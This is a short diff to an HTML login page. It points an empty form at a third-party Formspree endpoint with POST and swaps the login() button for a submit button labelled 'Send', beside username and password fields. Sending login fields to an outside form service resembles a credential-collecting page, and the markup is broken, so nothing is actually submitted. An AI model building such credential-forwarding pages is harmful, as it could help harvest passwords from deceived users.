@@ -5,7 +5,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Page</title>
-    <form action="https://formspree.io/f/xeoweerd"></form>
+    <form action="https://formspree.io/f/xeoweerd"
+        method="POST"
+        ></form>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -53,7 +55,8 @@
         <h2>Login</h2>
         <input type="text" id="username" placeholder="Username" />
         <input type="password" id="password" placeholder="Password" />
-        <button onclick="login()">Login</button>
+        <!-- <button onclick="login()">Login</button> -->
+        <button type="submit">Send</button>
         <p id="error-message"></p>
     </div>
 
